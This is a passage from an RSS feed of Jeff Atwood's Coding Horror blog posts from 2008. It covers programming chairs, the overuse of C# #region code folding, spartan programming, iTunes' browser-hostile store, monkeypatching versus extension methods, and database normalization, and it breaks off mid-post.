<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>In <a href="http://www.codinghorror.com/blog/archives/000240.html">A Developer's Second Most Important Asset</a>, I described how buying a quality chair may be one of the <strong>smartest investments you can make as a software developer</strong>.</p>
<blockquote>In fact, after browsing chairs for the last few years of my career, I've come to one conclusion: you can't expect to get a decent chair for less than $500. If you are spending less than that on seating – unless you are getting the deal of the century on dot-bomb bankruptcy auctions – <em>you're probably making a mistake</em>.</blockquote>
<p>I still believe this to be true, and I urge any programmers reading this to seriously consider the value of what you're sitting in while you're on the job. In our profession, seating <em>matters</em>:</p>
<ul>
<li>
<strong>Chairs are a primary part of the programming experience.</strong> Eight hours a day, every day, for the rest of your working life – you're sitting in one. Like it or not, whatever you're sitting in has a measurable impact on your work experience.
</li>
<li>
<strong>Cheap chairs suck</strong>. Maybe I've become spoiled, but I have yet to sit in a single good, cheap chair. In my experience, the difference between the really great chairs and the cheap stuff is enormous. A quality chair is so comfortable and accommodating it effortlessly melts into the background, so you can focus on your work. A cheesy, cheap chair constantly reminds you how many hours of work you have left.
</li>
<li>
<strong>Chairs last.</strong> As I write this, I'm still sitting my original Aeron chair, which I purchased in 1998. I can't think of any other piece of equipment I use in my job that has lasted me <em>ten full years</em> and beyond. While the initial sticker shock of a quality chair may turn you off, try to mentally amortize that cost across the next ten years or more. </li>
</ul>
<p>Choice of seating is as fundamental and constant as it gets in a programming career otherwise marked by relentless change. They are long term investments. Why not take the same care and consideration in selecting a chair as you would with the other strategic directions that you'll carry with you for the rest of your career? Skimping yourself on a chair just doesn't make sense.</p>
<p>Although I've been quite happy with my <a href="http://www.amazon.com/dp/B0006NUB5U/?tag=codihorr-20">Herman Miller Aeron chair</a> over the last 10 years, I've always been a little disenchanted with the way it became associated with <a href="http://www.slate.com/id/2085064/">dot-com excess</a>:</p>
<blockquote>In the '90s, the Aeron became an emblem of the dot-com boom; it symbolized mobility, speed, efficiency, and 24/seven work weeks. The Aeron was a must-have for hot startups precisely because it looked the least like office furniture: It was more like a piece of machinery or unadorned engineering. The black Pellide webbing was durable, and hid whatever Jolt or Red Bull stains you might get on it. Held taut by an aluminum frame, the mesh allowed air to circulate and kept your body cool. What's more, the chair came in three sizes, like a personalized tool. Assorted knobs and levers allowed you to adjust the seat height, tilt tension, tilt range, forward tilt, arm height, arm width, arm angle, lumbar depth, and lumbar height. The Aeron was high-tech but sexy – which was how the dot-commers saw themselves.
<p><a href="http://www.amazon.com/dp/B0006NUB5U/?tag=codihorr-20"> <img alt="image placeholder" >
<p>But baby-faced CEOs weren't drawn to the Aeron only for the way it looked. The Aeron was a visual expression of the anti-corporate zeitgeist, a non-hierarchical philosophy about the workplace. An office full of Aerons implicitly rejected the Fortune 500, coat-and-tie, brick-and-mortar model in which the boss sinks back in an overpriced, oversized, leather dinosaur while his secretary perches on an Office Max toadstool taking notes.</p>
</blockquote>
<p>I recently had the opportunity to sit in a newer <a href="http://www.amazon.com/dp/B0002K11BK/?tag=codihorr-20">Herman Miller Mirra chair</a> on a trip, and I was surprised how much more comfortable it felt than my classic Aeron.</p>
<p><a href="http://www.amazon.com/dp/B0002K11BK/?tag=codihorr-20"><img alt="image placeholder" >
<p>The Mirra chair was an excellent recliner, too. I've been disappointed by how poorly the Aeron reclines. I actually broke my Aeron's recline pin once and had to replace it myself. So I've retrained myself not to recline, which is awkward, as I'm a natural recliner.</p>
<p>All this made me wonder if I should retire my Aeron and upgrade to something better. I liked the Mirra, but the comments to <a href="http://www.codinghorror.com/blog/archives/000240.html">my original chair post</a> have a lot of other good seating suggestions, too. Here are pictures and links to <strong>the chairs that were most frequently mentioned as contenders</strong>, in addition to the Mirra and Aeron pictured above:</p>
<p><a href="http://www.amazon.com/dp/B001BZP648/?tag=codihorr-20">Steelcase Think Chair</a></p>
<p><a href="http://www.amazon.com/dp/B001BZP648/?tag=codihorr-20"><img alt="image placeholder" >
<p><a href="http://www.amazon.com/dp/B000LSME00/?tag=codihorr-20">Steelcase Leap Chair</a></p>
<p><a href="http://www.amazon.com/dp/B000LSME00/?tag=codihorr-20"><img alt="image placeholder" >
<p><a href="http://www.amazon.com/dp/B0014DPL9C/?tag=codihorr-20">Ergohuman Mesh Chair</a></p>
<p><a href="http://www.amazon.com/dp/B0014DPL9C/?tag=codihorr-20"><img alt="image placeholder" >
<p><a href="http://www.amazon.com/dp/B001BPX1E0/?tag=codihorr-20">HumanScale Freedom Chair</a></p>
<p><a href="http://www.amazon.com/dp/B001BPX1E0/?tag=codihorr-20"><img alt="image placeholder" >
<p><a href="http://www.amazon.com/dp/B000NTF7OW/?tag=codihorr-20">HumanScale Liberty Chair</a></p>
<p><a href="http://www.amazon.com/dp/B000NTF7OW/?tag=codihorr-20"><img alt="image placeholder" >
<p>There were also some lesser known recommendations, such as the <a href="http://www.haworth.com/zody">Haworth Zody chair</a>, <a href="http://www.nightingalechairs.com/html/cxo/cxo_home.html">Nightingale CXO chair</a>, <a href="http://www.ergo4me.com/">BodyBilt ergo chairs</a>, <a href="http://www.hag.no/">Hag kneeling chair</a>, <a href="http://www.igoergo.com/_site/products.php?cat=02">NeutralPosture ergo</a>, the <a href="http://www.dwr.com/product/designers/a-c/don+chadwick/chadwick-chair-w--tilt.do">Chadwick Chair</a> from the original designer of the Aeron, and something called <a href="http://www.relaxtheback.com/the-swopper-product-6370282-1894">the swopper</a>.</p>
<p>Chair fit is, of course, a subjective thing. If you're investing $500+ in a chair, you'd understandably want to be sure it's "the one". The thing to do is find a local store that sells all these chairs and try them all out. Well, good luck with that. Don't even bother with your local big-box office supply chain. Your best bet seems to be <strong>back stores</strong>, as they tend to stock many of the more exotic chairs. Apparently they have a clientele of people who are willing to spend for comfort.</p>
<p>Reviews of individual chairs are relatively easy to find, but aren't particularly helpful in isolation. What we need is a multi-chair review roundup. The only notable roundup I know of is Slate's late 2005 <a href="http://www.slate.com/id/2131646/">Sit Happens: The Search for the Best Desk Chair</a>. It's not as comprehensive as I would like, but it does have most of the main contenders. Notably, Slate's winner was the <a href="http://www.amazon.com/dp/B000NTF7OW/?tag=codihorr-20">HumanScale Liberty</a>.</p>
<p>Some other helpful resources I've found, both in the comments to this post, and elsewhere:</p>
<ul>
<li>a <a href="http://www.crunchgear.com/2006/12/28/workspace-roundup-ergonomic-chairs/">multiple chair roundup at CrunchGear</a> </li>
<li>a fantastic <a href="http://www.google.com/notebook/public/02097020037672550236/BDTBmQgoQg8epiZgi">research page on chairs</a> someone compiled </li>
<li>a <a href="http://ehs.unc.edu/workplace_safety/ergonomics/chairs/">multiple-chair roundup at UNC</a> </li>
<li>another <a href="http://www.consumersearch.com/www/office/office-chairs/">chair roundup at Consumer Search</a>, as well as a <a href="http://www.consumersearch.com/www/office/office-chairs/reviews.html">meta-collection of roundups</a>. </li>
<li>video demos of <a href="http://www.youtube.com/watch?v=0T7e7UjWv3o">Leap</a>, and the <a href="http://www.office-seats.co.uk/tv.htm">HumanScale Freedom / Liberty</a> </li>
</ul>
<p>If this is all a bit too much <a href="http://furnitureporn.com/">furniture porn</a> for your tastes, I understand. As for me, I'm headed off to my local friendly neighborhood back store to figure out which of these chairs will best replace my aging Aeron. By my calculations, the Aeron cost me about $7 per month over its ten year lifetime; I figure my continued health and comfort while programming are worth at least that much.</p>
<p><span style="color: red;">Update:</span> Since people have been asking, I ultimately decided the best fit and feel for me, personally, was the <a href="http://www.amazon.com/dp/B0002K11BK/?tag=codihorr-20">Herman Miller Mirra chair</a>. It's a huge upgrade from my ten year old Aeron. It feels like three or four revisions better. For example, the front lip of the seat is adjustable, which addresses one of the major concerns I had with my Aeron – as well as the vastly improved reclining I mentioned above. The only unexpected downside is that the plastic back is a little rough on the skin if you sit, er... shirtless. Although I am very pleased with my new shadow Mirra with citron back (<a href="http://www.codinghorror.com/blog/images/mirra-chair-shadow-citron.jpg">pic</a>), I urge you to do the research and try the chairs yourself before deciding.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/investing-in-a-quality-programming-chair/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Problem With Code Folding ]]></title>
<link>https://blog.codinghorror.com/the-problem-with-code-folding/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
When you join a team, it's important to <b>bend your preferences a little to accommodate the generally accepted coding practices of that team.</b> Not everyone has to agree on every miniscule detail of the code, of course, but it's a good idea to dicuss it with your team and decide on overall approaches and philosophy beforehand. It promotes team harmony, and more than that, it's just common courtesy. As they say, <i><a href="http://en.wikipedia.org/wiki/When_in_Rome">when in Rome</a>, do as the Romans do.</i>
</p>
<p>
I've always been wary of cowboy coders who rolled into an ongoing project on fresh horses and immediately started dictating terms. It's a very short trip indeed from there to <a href="http://www.codinghorror.com/blog/archives/000992.html">Who Wrote This Crap</a>, and the predictable, inevitable finger-pointing at the foolhardy programmers who came before you begins. Don't be that guy or gal. <a href="http://www.yafla.com/dennisforbes/Effectively-Integrating-Into-Software-Development-Teams/Effectively-Integrating-Into-Software-Development-Teams.html">Work with your team</a>, not against it.
</p>
<p>
Still, there are some coding preferences people may feel.. <i>strongly</i>.. about. If that's the case, try to clear the air and address those strong preferences up front, as early as possible. Don't let them simmer. For me, the use of <a href="http://www.google.com/search?q=c%23+region">#region</a> is one of those things. I tried to make myself clear in <a href="http://twitter.com/codinghorror/statuses/837284151">this twitter message</a>:
</p>
<p>
<a href="http://twitter.com/codinghorror/statuses/837284151"><img alt="image placeholder" >
</p>
<p>
So what is <code>#region</code>? It's a named hint you place in C# or VB.NET code to set a <b>code folding point</b>. Any code placed inside that region is, by default, collapsed when you re-open it in the editor. Here's a random example from the <a href="http://logging.apache.org/log4net/download.html">Log4Net project</a>:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Immediately I have a problem: <b>I can't see anything!</b> I have to manually expand those sections to browse any of the code in this class. It is possible to configure the Visual Studio IDE to not fold any of the regions when files are opened, but this is the out of box behavior, so that's what most developers will see. And of course there are keyboard shortcuts to deal with the regions:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td>
Ctrl+M, Ctrl+M
</td>
<td>
Collapse or expand the block you're currently in.
</td>
</tr>
<tr>
<td>
Ctrl+M, Ctrl+O
</td>
<td>
Collapse all blocks in the file
</td>
</tr>
<tr>
<td>
Ctrl+M, Ctrl+L
</td>
<td>
Expand all blocks in the file
</td>
</tr>
<tr>
<td>
Ctrl+M, Ctrl+P
</td>
<td>
Stop outlining mode. (Ctrl+M, Ctrl+O resumes)
</td>
</tr>
</table>
<p>
Here's the really sick part: once you expand the above log4net code there's <b>literally three pages worth of code there!</b> After you strip out all the massive XMLDoc comments and the dozen or so #region directives, you <i>could</i> have had all the code at your fingertips with a minor flick of the mouse wheel, in a simple scrollable layout.
</p>
<p>
I daresay being able to <i>see the damn code</i> is more important than having it meticulously segmented into six pointless little named buckets, but apparently a lot of programmers can't get enough of stuffing their code into pointless little named buckets. It's as if they've forgotten what the scroll bar -- and <a href="http://www.codinghorror.com/blog/archives/000432.html">incremental search</a> -- is for.
</p>
<p>
The <code>#region</code> directive drives me bonkers. It's not evil, per se, but I feel it is criminally overused in practice and heavily prone to abuse. I strongly urge you to think about how you're using code folding, because as I see it, there are a lot of downsides:
</p>
<p>
</p>
<ol>
<li>
<b>Folding directives are glorified comments</b>. <code>#region</code> has zero meaning to the compiler; it's a hint to the editor to allow code folding. It doesn't do any namespacing or scoping. Why, exactly, are we writing code to accommodate the editor? It boggles my mind that we'd add significant lines of code to our project that do nothing but offer organizational hints to the editor. Even traditional comments are a better value for your keystroke, because they can be more expressive. And folding is certainly no substitute at all for bona-fide refactoring.
<p>
</p>
</li>
<li>
<b>Folding is used to sweep code under the rug</b>. Got a bunch of boring boilerplate code that makes your eyes water? A slew of ugly, gnarly code that nobody in their right mind wants to look at? Hide it in a region and fold that sucker into oblivion! Problem solved, right? Hardly. Your project is now full of crappy code that <i>you can't see</i>. That's worse. Much worse! Code that hides from you is code that will rot in the most putrescent and painful way possible. Your code should be front and center at all times -- exposed to as many programmers' eyes, and as much healing light, as possible.
<p>
</p>
</li>
<li>
<b>Folding is used to mask excessive length.</b> The presence of folded code can lull developers into a false sense of what clean code looks like. Under the cover of folding, you can end up writing long, horrible spaghetti code blocks. If the code needs the crutch of folding to <i>look</i> organized, it's bad code.
<p>
</p>
</li>
<li>
<b>Folding can hide deficiencies in your editor.</b> The presence of so-called "standard" boilerplate regions like "Public Constructors" and "Public Properties" and "Events" is not a feature. It's a bug. The editor should <i>automatically</i> offer to fold up these common structural blocks for you! I'm continually amazed that programmers spend time doing this scutwork when they could be writing useful code. Or at least demanding a smarter code editor.
</li>
</ol>
<p>
I urge developers to <b>write code that doesn't <i>need</i> folding to be readable, clear, and concise</b>. I'm sure there are sane uses for code folding out there somewhere, but I rarely see them.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-06T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-problem-with-code-folding/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Spartan Programming ]]></title>
<link>https://blog.codinghorror.com/spartan-programming/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As I grow older and <s>wiser</s>even older as a programmer, I've found that my personal coding style has trended heavily toward minimalism.
</p>
<p>
I was pleased, then, to find many of the coding conventions I've settled on over the last 20 years codified in <a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Spartan_programming">Spartan programming</a>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
No, not that sort of <a href="http://en.wikipedia.org/wiki/Spartan_Army">Spartan</a>, although it is historically related. The particular meaning of <b>spartan</b> I'm referring to is this one:
</p>
<p>
</p>
<blockquote>
(adj) ascetic, ascetical, austere, spartan (practicing great self-denial) <i>"Be systematically ascetic...do...something for no other reason than that you would rather not do it"</i> - William James; <i>"a desert nomad's austere life"; "a spartan diet"; "a spartan existence"</i>
</blockquote>
<p>
I've tried to <a href="http://www.codinghorror.com/blog/archives/000791.html">code smaller</a>, even going so far as to write <a href="http://www.codinghorror.com/blog/archives/000878.html">no code at all</a> when I can get away with it. <a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Spartan_programming">Spartan programming</a> aligns perfectly with these goals. You strive for <b>simultaneous minimization</b> of your code in many dimensions:
</p>
<ol>
<li>
<a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Horizontal_complexity%2C_spartan_reduction_of">Horizontal complexity</a>. The depth of nesting of control structures.
</li>
<li>
<a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Vertical_complexity%2C_spartan_reduction_of">Vertical complexity</a>. The number of lines or length of code.
</li>
<li>
<a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Token_count%2C_spartan_reduction_of">Token count</a>.
</li>
<li>
<a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Character_count%2C_spartan_reduction_of">Character count</a>.
</li>
<li>
<a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Parameters%2C_spartan_reduction_of">Parameters</a>. The number of parameters to a routine or a generic structure.
</li>
<li>
<a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Variables%2C_spartan_reduction_of">Variables</a>.
</li>
<li>Looping instructions. The number of iterative instructions and their nesting level.
</li>
<li>Conditionals. The number of <code>if</code> and multiple branch <code>switch</code> statements.
</li>
</ol>
<p>
The discipline of spartan programming means <b>frugal use of variables</b>:
</p>
<p>
</p>
<ol>
<li>Minimize <i>number</i> of variables. Inline variables which are used only once. Take advantage of <code>foreach</code> loops.</li>
<li>Minimize <i>visibility</i> of variables and other identifiers. Define variables at the smallest possible scope.</li>
<li>Minimize <i>accessibility</i> of variables. Prefer the greater encapsulation of <code>private</code> variables.</li>
<li>Minimize <i>variability</i> of variables. Strive to make variables <code>final</code> in Java and <code>const</code> in C++. Use annotations or restrictions whenever possible.</li>
<li>Minimize <i>lifetime</i> of variables. Prefer ephemeral variables to longer lived ones. Avoid persistent variables such as files.</li>
<li>Minimize <i>names</i> of variables. Short-lived, tightly scoped variables can <a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Terse_variable_naming">use concise, terse names</a>.</li>
<li>Minimize <i>use of array</i> variables. Replace them with collections provided by your standard libraries.</li>
</ol>
<p>
It also means <b>frugal use of control structures</b>, with early <code>return</code> whenever possible. This is probably best illustrated with an actual example, starting with raw code and refactoring it using the spartan programming techniques:
</p>
<p>
</p>
<ul>
<li>Applying Spartan programming techniques <a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/Spartan_programming_C_example">to a C File</a>
</li>
<li>Applying Spartan programming techniques <a href="http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/SendAnEmail_case_study">to a Java function</a>
</li>
</ul>
<p>
I don't agree with all the rules and guidelines presented here, but I was definitely nodding along with the majority of the page. <b>Minimalism isn't always the right choice, but it's rarely the <i>wrong</i> choice.</b> You could certainly do worse than to adopt the discipline of spartan programming on your next programming project.
</p>
<p>
(hat tip to Yuval Tobias for sending this link my way)
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-08T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/spartan-programming/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ iTunes is Anti-Web ]]></title>
<link>https://blog.codinghorror.com/itunes-is-anti-web/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Ever find yourself clicking on links to music or videos and getting <b>blasted in the face with this delightful little number?</b>
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
That's right -- links to any sort of music, TV shows, movies, podcasts, audiobooks or anything else available through Apple's iTunes store <i>requires custom software</i> to be installed on your computer before they will display thing one to you.
</p>
<p>
Is it so unreasonable to expect links in your browser to resolve to, oh, I don't know, <b>web pages containing information about the thing you just clicked on?</b> Is there anything more anti-web than demanding users install custom software to display information that could have just as easily been delivered through the browser?
</p>
<p>
So here's what we know:
</p>
<p>
</p>
<ul>
<li>Apple wants us to install iTunes.
</li>
<li>iTunes is necessary to sync media with Apple's iPods and iPhones.
</li>
<li>iTunes is only available for Windows and OS X.
</li>
<li>iTunes is required to browse or buy anything from the iTunes Store.
</li>
</ul>
<p>
That's all well and good for people who own iPods and iPhones -- and happen to be running Windows or OS X, I suppose.
</p>
<p>
But what about the rest of the world? Why lock them out with <a href="http://www.codinghorror.com/blog/archives/000881.html">the ultimate login barrier</a>? We might like to browse the iTunes Store, too. At the very least, I might want some basic information about the media I just clicked on. Right here in my browser where I already am. Information like what the heck it is, some artwork, maybe some audio clips, how much it costs -- sweet talk me. Make me want to buy it through the Apple Store. Dazzle me with your simplicity and ease of use. Beguile me with your wares!
</p>
<p>
Or, you could <b>bludgeon me with the digital equivalent of a giant stop sign</b>.
</p>
<p>
Hey, "it just works". Except when it doesn't.
</p>
<p>
I'm certainly able to click through to eminently purchaseable media on dozens of other places on the web using nothing more than my web browser. Let's imagine, for a moment, how utterly ridiculous it would be if I had to <b>install the Amazon application</b> to browse and purchase media from Amazon.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
And yet this is exactly how the iTunes Store works. Or doesn't work, depending on your perspective.
</p>
<p>
I can understand requiring iTunes once you want to sync your media with Apple hardware devices -- although I would argue syncing should really be a fundamental, built in function of the operating system. But I'm not trying to sync anything! All I did was click on a link. It's <b>downright user hostile to demand installation of a special application merely to browse the store</b>, and it is most certainly against everything the web stands for and was built on.
</p>
<p>
The last "application" I can recall needing to install to get to things online was AOL.
</p>
<p>
<a href="http://www.mikerichardson.name/oldaol/"><img alt="image placeholder" >
</p>
<p>
And we all know <a href="http://www.codinghorror.com/blog/archives/000898.html">how great that turned out</a>.
</p>
<p>
For all the buzz about the Apple "it just works" mystique, the current iTunes Store design surely doesn't -- at least <b>not the same way the rest of the web does</b>. And I, for one, <a href="http://www.25hoursaday.com/weblog/2008/07/07/AListOfCompaniesWorkingHardToScrewUpMyWebExperience.aspx">can't get behind that</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-09T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/itunes-is-anti-web/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Monkeypatching For Humans ]]></title>
<link>https://blog.codinghorror.com/monkeypatching-for-humans/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Although <a href="http://www.codinghorror.com/blog/archives/000634.html">I love strings</a>, sometimes the <code>String</code> class can break your heart. For example, in C#, there is no <code>String.Left()</code> function. Fair enough; we can roll up our sleeves and write our own function lickety-split:
</p>
<p>
</p>
<pre>
public static string Left(string s, int len)
{
if (len == 0 || s.Length == 0)
return "";
else if (s.Length &lt;= len)
return s;
else
return s.Substring(0, len);
}
</pre>
<p>
And call it like so:
</p>
<p>
</p>
<pre>
var s = "Supercalifragilisticexpialidocious";
s = Left(s, 5);
</pre>
<p>
Fairly painless, right?
</p>
<p>
But with the advent of C# 3.0, there's an even better way -- <a href="http://msdn.microsoft.com/en-us/library/bb383977.aspx">extension methods</a>. With an extension method, we "extend" the <code>String</code> to add the missing function. The code is fairly similar; I'll highlight the changed parts in red.
</p>
<p>
</p>
<pre>
public static string Left(<font color="red">this</font> string s, int len)
{
if (len == 0 || s.Length == 0)
return "";
else if (s.Length &lt;= len)
return s;
else
return s.Substring(0, len);
}
</pre>
<p>
And now we can call it <b>as if this very method existed on the String class as shipped</b>:
</p>
<p>
</p>
<pre>
var s = "Supercalifragilisticexpialidocious";
s = <font color="red">s.Left(5);</font>
</pre>
<p>
Pretty slick. It's difficult not to fall in love with extension methods, as they allow you to mold classes into exactly what you think they should be. This is fairly innocuous in C#, as <b>extension methods only allow you to add new functionality to classes</b>, not override, remove, or replace anything.
</p>
<p>
But imagine if you <i>could</i>.
</p>
<p>
Well, that's exactly how it is in other, more dynamic languages such as Javascript, Python, Perl, and Ruby. Something as prosaic as C# extensions is old hat to these folks. In those languages, <i>you could redefine everything in the <code>String</code> class if you wanted to</i>. This is commonly known in dynamic language circles as <a href="http://en.wikipedia.org/wiki/Monkey_patch">monkeypatching</a>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
If the idea of monkeypatching scares you a little, it probably should. Can you imagine debugging code where the <code>String</code> class had subtly different behaviors from the <code>String</code> you've learned to use? Monkeypatching <a href="http://avdi.org/devblog/2008/02/23/why-monkeypatching-is-destroying-ruby/">can be incredibly dangerous in the wrong hands</a>, as Avdi Grimm notes:
</p>
<p>
</p>
<blockquote>
Monkey patching is the new black [in the Ruby community].  It's what all the hip kids are doing.  To the point that smart, experienced hackers reach for a monkey patch as their tool of first resort, even when a simpler, more traditional solution is possible.
<p>
I don't believe this situation to be sustainable.  Where I work, <b>we are already seeing subtle, difficult-to-debug problems crop up as the result of monkey patching in plugins.</b> Patches interact in unpredictable, combinatoric ways.  And by their nature, bugs caused by monkey patches  are more difficult to track down than those introduced by more traditional classes and methods.  As just one example: on one project, it was a known caveat that we could not rely on class inheritable attributes as provided by ActiveSupport.  No one knew why.  Every Model we wrote had to use awkward workarounds.  Eventually we tracked it down in a plugin that generated admin consoles.  It was overwriting <code>Class.inherited()</code>.  It took us months to find this out.
</p>
<p>
This is just going to get worse if we don't do something about it.  And the "something" is going to have to be a cultural shift, not a technical fix.  I believe it is time for experienced Ruby programmers to wean ourselves off of monkey patching, and start demonstrating more robust techniques.
</p>
</blockquote>
<p>
Try to imagine a world where <b>every programmer you know is a wannabe language designer, bent on molding the language to their whims</b>. When I close my eyes and imagine it, I have a vision of the apocalypse, a perfect, pitch-black storm of utterly incomprhensible, pathologically difficult to debug code.
</p>
<p>
I was just looking at random PHP plugin code the other day, and it was, frankly, crap. But that's because <i>most code is crap</i>. <a href="http://www.codinghorror.com/blog/archives/000099.html">Including my own</a>. It is, sadly, the statistical norm. That's why <a href="http://www.codinghorror.com/blog/archives/000824.html">sites like The Daily WTF</a> are guaranteed to have more material than they can possibly ever publish for the next millennia. (Note to self: invest in this website). I can only imagine what that PHP plugin code would have looked like, had its developer been granted the ability to redefine fundamental PHP keywords and classes at will. These are the sort of thoughts that drive me to drink <a href="http://www.amazon.com/dp/B000NY30P0/?tag=codihorr-20">Bawls</a>. And that stuff is disgusting.
</p>
<p>
You might say that PHP, sans the fundamental dynamic language ability to monkeypatch, is <a href="http://weblog.raganwald.com/2006/10/are-we-blub-programmers.html">just another crappy Blub language</a>. But there's also a ton of <a href="http://www.codinghorror.com/blog/archives/001119.html">incredibly useful PHP code out there</a>. So it seems to me that the ability to monkeypatch doesn't stop people from producing a huge volume of useful code, even in a kind of.. horrible language. Some of it is even good!
</p>
<p>
While I acknowledge the power and utility of dynamic language monkeypatching, I know enough about programmers -- myself <i>absolutely</i> included -- to know the vast majority of us have absolutely no business whatsoever re-designing a programming language. There's a reason some of the <a href="http://en.wikipedia.org/wiki/Anders_Hejlsberg">most</a> <a href="http://en.wikipedia.org/wiki/John_McCarthy_%28computer_scientist%29">deeply</a> <a href="http://en.wikipedia.org/wiki/Dennis_Ritchie">respected</a> <a href="http://en.wikipedia.org/wiki/Guido_van_Rossum">computer</a> <a href="http://en.wikipedia.org/wiki/Niklaus_Wirth">scientists</a> in the world end up as language designers.
</p>
<p>
Perhaps then, given the risks, <b>monkeypatching should mean reaching for the meta-hammer as infrequently as humanly possible</b>. This is a position that Avdi himself espouses <a href="http://weblog.raganwald.com/2008/02/1100inject.html#8589089242300871488">in a followup comment</a>:
</p>
<p>
</p>
<blockquote>
I'm afraid a lot of people have missed the actual meat of my argument -- that dynamic extension of classes is currently overused in Ruby, in ways that are:
<p>
</p>
<ul>
<li>Needless - another technique (such as a mixin, or locally extending individual objects) would have worked as well or better.
</li>
<li>Overcomplicated - the use of a monkey patch actually created more work for the author.
</li>
<li>Fragile - the solution is tightly bound to third-party internals, reducing the usefulness of the plugin or gem because it is prone to breakage.
</li>
<li>Excessively wide in scope - by hardcoding extensions to core classes, the author takes the choice to scope the change out of the plugin/gem user's hands, further limiting utility.
</li>
</ul>
<p>
My point is that there are alternatives - often alternatives which are actually easier to implement and will make your plugin or gem more useful to the user.
</p>
</blockquote>
<p>
While I enjoy the additive nature of C# extensions, even those are enough to make me a little nervous, as mild as they are. Full-blown dynamic language monkeypatching goes even further; it might even be the ultimate expression of programming power. Is there anything more pure and godlike than <b>programming your own programming language?</b>
</p>
<p>
But if wielding that power doesn't scare and humble you a little, too, then maybe you should leave the monkeypatching to the <a href="http://www.paulgraham.com/langdes.html">really smart monkeys</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-07-12T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/monkeypatching-for-humans/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Maybe Normalizing Isn't Normal ]]></title>
<link>https://blog.codinghorror.com/maybe-normalizing-isnt-normal/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
One of the items we're struggling with now on <a href="http://stackoverflow.com">Stack Overflow</a> is how to maintain near-instantaneous performance levels in a relational database as the amount of data increases. More specifically, how to <a href="http://www.pui.ch/phred/archives/2005/06/tagsystems-performance-tests.html">scale our tagging system</a>. Traditional database design principles tell you that well-designed databases are always <a href="http://en.wikipedia.org/wiki/Database_normalization">normalized</a>, but I'm not so sure.
</p>
<p>
Dare Obasanjo had an excellent post <a href="http://www.25hoursaday.com/weblog/CommentView.aspx?guid=cc0e740c-a828-4b9d-b244-4ee96e2fad4b">When Not to Normalize your SQL Database</a> wherein he helpfully provides a <b>sample database schema for a generic social networking site</b>. Here's what it would look like if we designed it in the accepted normalized fashion:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Normalization certainly delivers in terms of limiting duplication. Every entity is represented once, and only once -- so there's almost no risk of inconsistencies in the data. But this design also requires a whopping <i>six joins</i> to retrieve a single user's information.
</p>
<p>
</p>
<pre>
select * from Users u
<b>inner join</b> UserPhoneNumbers upn
on u.user_id = upn.user_id
<b>inner join</b> UserScreenNames usn
on u.user_id = usn.user_id
<b>inner join</b> UserAffiliations ua
on u.user_id = ua.user_id
<b>inner join</b> Affiliations a
on a.affiliation_id = ua.affiliation_id
<b>inner join</b> UserWorkHistory uwh
on u.user_id = uwh.user_id
<b>inner join</b> Affiliations wa
on uwh.affiliation_id = wa.affiliation_id
</pre>
<p>
(<font color="red">Update:</font> this isn't intended as a real query; it's only here to visually illustrate the fact that you need six joins -- or six individual queries, if that's your cup of tea -- to get all the information back about the user.)
</p>
<p>
Those six joins aren't doing anything to help your system's performance, either. Full-blown normalization isn't merely difficult to understand and hard to work with -- it can also be quite slow.
</p>
<p>
As Dare points out, the obvious solution is to <b>denormalize</b> -- to collapse a lot of the data into a single Users table.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
This works -- queries are now blindingly simple (<code>select * from users</code>), and probably blindingly fast, as well. But you'll have a bunch of gaping blank holes in your data, along with a slew of awkwardly named field arrays. And all those pesky data integrity problems the database used to enforce for you? Those are all your job now. Congratulations on your demotion!
</p>
<p>
Both solutions have their pros and cons. So let me put the question to you: <b>which is better -- a normalized database, or a denormalized database?</b>
</p>
<p>
